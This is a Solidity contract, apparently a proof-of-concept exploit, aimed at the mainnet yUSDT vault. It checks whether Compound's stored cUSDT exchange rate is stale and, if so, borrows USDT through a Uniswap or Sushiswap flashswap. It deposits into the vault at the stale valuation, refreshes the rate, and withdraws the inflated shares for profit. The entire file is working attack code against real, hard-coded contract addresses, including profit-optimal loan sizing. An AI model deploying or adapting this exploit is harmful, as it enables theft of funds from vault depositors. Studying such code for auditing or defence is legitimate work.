// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
}

interface IyUSDT is IERC20 {
    function deposit(uint256 amount) external;
    function withdraw(uint256 shares) external;
    function calcPoolValueInToken() external view returns (uint256);
    function balanceCompound() external view returns (uint256);
}

interface ICERC20 {
    function exchangeRateStored() external view returns (uint256);
    function exchangeRateCurrent() external returns (uint256);
    function totalSupply() external view returns (uint256);
    function totalBorrows() external view returns (uint256);
    function totalReserves() external view returns (uint256);
    function reserveFactorMantissa() external view returns (uint256);
    function borrowRatePerBlock() external view returns (uint256);
    function accrualBlockNumber() external view returns (uint256);
    function getCash() external view returns (uint256);
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2Pair {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

contract FlawVerifier {
    address public constant VAULT = 0x83f798e925BcD4017Eb265844FDDAbb448f1707D;
    address public constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address public constant CUSDT = 0x39AA39c021dfbaE8faC545936693aC917d5E7563;
    address public constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

    address public constant UNISWAP_V2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
    address public constant SUSHISWAP_FACTORY = 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac;

    uint256 internal constant WAD = 1e18;
    uint256 internal constant V2_FEE_NUMERATOR = 3;
    uint256 internal constant V2_FEE_DENOMINATOR = 997;
    uint256 internal constant V2_REPAY_NUMERATOR = 1000;

    uint256 internal _profitAmount;
    bool public hypothesisValidated;
    bool public usedFlashswap;

    enum Status {
        NotRun,
        Success,
        NoCompoundPosition,
        NoStaleDelta,
        DirectAttemptReturnedNoProfit,
        FlashswapEconomicallyInfeasible,
        FlashswapFailed,
        FlashswapReturnedNoProfit
    }

    Status public status;

    constructor() {}

    function executeOnOpportunity() external {
        if (status == Status.Success) {
            return;
        }

        IyUSDT vault = IyUSDT(VAULT);
        uint256 cBalance = vault.balanceCompound();
        if (cBalance == 0) {
            status = Status.NoCompoundPosition;
            hypothesisValidated = false;
            return;
        }

        uint256 staleRate = ICERC20(CUSDT).exchangeRateStored();
        uint256 currentRate = _previewExchangeRateCurrent();
        if (currentRate <= staleRate) {
            status = Status.NoStaleDelta;
            hypothesisValidated = false;
            return;
        }

        // yUSDT prices the aggregate pool across all lenders. A stale Compound slice
        // can therefore understate `pool` even when the currently selected provider is Aave.
        uint256 stalePool = vault.calcPoolValueInToken();
        uint256 deltaUnderlying = (cBalance * (currentRate - staleRate)) / WAD;

        uint256 directCapital = IERC20(USDT).balanceOf(address(this));
        if (_expectedDirectProfit(directCapital, stalePool, deltaUnderlying) > 0) {
            _runDirect(directCapital);
            if (_profitAmount > 0) {
                status = Status.Success;
                hypothesisValidated = true;
                return;
            }
            status = Status.DirectAttemptReturnedNoProfit;
            hypothesisValidated = false;
            return;
        }

        (address pair, uint256 flashAmount) = _bestFlashswap(stalePool, deltaUnderlying);
        if (pair == address(0) || flashAmount == 0) {
            status = Status.FlashswapEconomicallyInfeasible;
            hypothesisValidated = false;
            return;
        }

        usedFlashswap = true;
        bool ok = _tryFlashswap(pair, flashAmount);
        if (!ok) {
            status = Status.FlashswapFailed;
            hypothesisValidated = false;
            return;
        }

        if (_profitAmount > 0) {
            status = Status.Success;
            hypothesisValidated = true;
        } else {
            status = Status.FlashswapReturnedNoProfit;
            hypothesisValidated = false;
        }
    }

    function executeFlashswap(address pair, uint256 amount) external {
        require(msg.sender == address(this), "self only");

        address token0 = IUniswapV2Pair(pair).token0();
        address token1 = IUniswapV2Pair(pair).token1();
        require(token0 == USDT || token1 == USDT, "pair missing USDT");

        uint256 amount0Out = token0 == USDT ? amount : 0;
        uint256 amount1Out = token1 == USDT ? amount : 0;
        IUniswapV2Pair(pair).swap(amount0Out, amount1Out, address(this), abi.encode(pair, amount));
    }

    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        (address expectedPair, uint256 principal) = abi.decode(data, (address, uint256));
        require(msg.sender == expectedPair, "unexpected pair");
        require(sender == address(this), "unexpected sender");

        uint256 amountBorrowed = amount0 > 0 ? amount0 : amount1;
        require(amountBorrowed == principal, "unexpected principal");

        uint256 startingBalance = IERC20(USDT).balanceOf(address(this));
        uint256 baseBalance = startingBalance - amountBorrowed;

        _runExploitPath(amountBorrowed);

        uint256 owed = _flashswapRepayment(amountBorrowed);
        require(IERC20(USDT).balanceOf(address(this)) >= owed, "insufficient repayment");
        _safeTransfer(USDT, msg.sender, owed);

        uint256 endingBalance = IERC20(USDT).balanceOf(address(this));
        if (endingBalance > baseBalance) {
            _profitAmount += endingBalance - baseBalance;
        }
    }

    function profitToken() external pure returns (address) {
        return USDT;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function previewStaleDelta() external view returns (uint256) {
        uint256 staleRate = ICERC20(CUSDT).exchangeRateStored();
        uint256 currentRate = _previewExchangeRateCurrent();
        if (currentRate <= staleRate) {
            return 0;
        }
        return (IyUSDT(VAULT).balanceCompound() * (currentRate - staleRate)) / WAD;
    }

    function previewFlashAmount() external view returns (uint256) {
        uint256 staleRate = ICERC20(CUSDT).exchangeRateStored();
        uint256 currentRate = _previewExchangeRateCurrent();
        if (currentRate <= staleRate) {
            return 0;
        }

        uint256 stalePool = IyUSDT(VAULT).calcPoolValueInToken();
        uint256 deltaUnderlying = (IyUSDT(VAULT).balanceCompound() * (currentRate - staleRate)) / WAD;
        (, uint256 flashAmount) = _bestFlashswap(stalePool, deltaUnderlying);
        return flashAmount;
    }

    function _runDirect(uint256 capital) internal {
        uint256 startBalance = IERC20(USDT).balanceOf(address(this));
        _runExploitPath(capital);
        uint256 endBalance = IERC20(USDT).balanceOf(address(this));
        if (endBalance > startBalance) {
            _profitAmount += endBalance - startBalance;
        }
    }

    function _runExploitPath(uint256 amount) internal {
        if (amount == 0) {
            return;
        }

        uint256 sharesBefore = IERC20(VAULT).balanceOf(address(this));

        // Stage 2: deposit while yUSDT still values cUSDT via exchangeRateStored().
        _safeApprove(USDT, VAULT, 0);
        _safeApprove(USDT, VAULT, amount);
        IyUSDT(VAULT).deposit(amount);

        uint256 shares = IERC20(VAULT).balanceOf(address(this)) - sharesBefore;
        require(shares > 0, "no shares minted");

        // Stage 3: any public Compound touch refreshes the stored exchange rate.
        ICERC20(CUSDT).exchangeRateCurrent();

        // Stage 4: withdraw the inflated shares after the refreshed valuation lands.
        IyUSDT(VAULT).withdraw(shares);
    }

    function _bestFlashswap(uint256 stalePool, uint256 deltaUnderlying) internal view returns (address bestPair, uint256 bestAmount) {
        uint256 targetAmount = _optimalFlashAmount(stalePool, deltaUnderlying);
        if (targetAmount == 0) {
            return (address(0), 0);
        }

        (address uniPair, uint256 uniAmount) = _quoteFactory(UNISWAP_V2_FACTORY, targetAmount, stalePool, deltaUnderlying);
        (address sushiPair, uint256 sushiAmount) =
            _quoteFactory(SUSHISWAP_FACTORY, targetAmount, stalePool, deltaUnderlying);

        uint256 uniProfit = _expectedFlashswapProfit(uniAmount, stalePool, deltaUnderlying);
        uint256 sushiProfit = _expectedFlashswapProfit(sushiAmount, stalePool, deltaUnderlying);

        if (uniProfit >= sushiProfit && uniProfit > 0) {
            return (uniPair, uniAmount);
        }
        if (sushiProfit > 0) {
            return (sushiPair, sushiAmount);
        }
        return (address(0), 0);
    }

    function _quoteFactory(
        address factory,
        uint256 targetAmount,
        uint256 stalePool,
        uint256 deltaUnderlying
    ) internal view returns (address pair, uint256 amount) {
        pair = IUniswapV2Factory(factory).getPair(USDT, WETH);
        if (pair == address(0)) {
            return (address(0), 0);
        }

        uint256 pairLiquidity = IERC20(USDT).balanceOf(pair);
        if (pairLiquidity <= 1) {
            return (pair, 0);
        }

        uint256 capped = targetAmount;
        uint256 maxBorrow = pairLiquidity - 1;
        if (capped > maxBorrow) {
            capped = maxBorrow;
        }

        if (_expectedFlashswapProfit(capped, stalePool, deltaUnderlying) == 0) {
            return (pair, 0);
        }

        return (pair, capped);
    }

    function _tryFlashswap(address pair, uint256 amount) internal returns (bool ok) {
        try this.executeFlashswap(pair, amount) {
            return true;
        } catch {
            return false;
        }
    }

    function _safeApprove(address token, address spender, uint256 amount) internal {
        (bool ok, bytes memory ret) =
            token.call(abi.encodeWithSelector(bytes4(keccak256("approve(address,uint256)")), spender, amount));
        require(ok && (ret.length == 0 || abi.decode(ret, (bool))), "approve failed");
    }

    function _safeTransfer(address token, address to, uint256 amount) internal {
        (bool ok, bytes memory ret) =
            token.call(abi.encodeWithSelector(bytes4(keccak256("transfer(address,uint256)")), to, amount));
        require(ok && (ret.length == 0 || abi.decode(ret, (bool))), "transfer failed");
    }

    function _previewExchangeRateCurrent() internal view returns (uint256) {
        ICERC20 c = ICERC20(CUSDT);
        uint256 accrualBlock = c.accrualBlockNumber();
        if (accrualBlock == block.number) {
            return c.exchangeRateStored();
        }

        uint256 blockDelta = block.number - accrualBlock;
        uint256 borrowRate = c.borrowRatePerBlock();
        uint256 borrowsPrior = c.totalBorrows();
        uint256 reservesPrior = c.totalReserves();
        uint256 reserveFactor = c.reserveFactorMantissa();
        uint256 totalSupply = c.totalSupply();
        uint256 cash = c.getCash();

        uint256 simpleInterestFactor = borrowRate * blockDelta;
        uint256 interestAccumulated = (simpleInterestFactor * borrowsPrior) / WAD;
        uint256 totalBorrowsNew = borrowsPrior + interestAccumulated;
        uint256 totalReservesNew = reservesPrior + ((reserveFactor * interestAccumulated) / WAD);

        return ((cash + totalBorrowsNew - totalReservesNew) * WAD) / totalSupply;
    }

    function _optimalFlashAmount(uint256 stalePool, uint256 deltaUnderlying) internal pure returns (uint256) {
        if (stalePool == 0 || deltaUnderlying == 0) {
            return 0;
        }

        if (deltaUnderlying * V2_FEE_DENOMINATOR <= stalePool * V2_FEE_NUMERATOR) {
            return 0;
        }

        uint256 radicand = (deltaUnderlying * stalePool * V2_FEE_DENOMINATOR) / V2_FEE_NUMERATOR;
        uint256 root = _sqrt(radicand);
        if (root <= stalePool) {
            return 0;
        }

        return root - stalePool;
    }

    function _expectedDirectProfit(uint256 amount, uint256 stalePool, uint256 deltaUnderlying) internal pure returns (uint256) {
        if (amount == 0 || deltaUnderlying == 0) {
            return 0;
        }
        return (amount * deltaUnderlying) / (stalePool + amount);
    }

    function _expectedFlashswapProfit(uint256 amount, uint256 stalePool, uint256 deltaUnderlying)
        internal
        pure
        returns (uint256)
    {
        uint256 gross = _expectedDirectProfit(amount, stalePool, deltaUnderlying);
        uint256 fee = _flashswapFee(amount);
        if (gross <= fee) {
            return 0;
        }
        return gross - fee;
    }

    function _flashswapRepayment(uint256 amount) internal pure returns (uint256) {
        return ((amount * V2_REPAY_NUMERATOR) / V2_FEE_DENOMINATOR) + 1;
    }

    function _flashswapFee(uint256 amount) internal pure returns (uint256) {
        return _flashswapRepayment(amount) - amount;
    }

    function _sqrt(uint256 x) internal pure returns (uint256 z) {
        if (x == 0) {
            return 0;
        }
        uint256 y = x;
        z = (x + 1) / 2;
        while (z < y) {
            y = z;
            z = (x / z + z) / 2;
        }
        return y;
    }
}
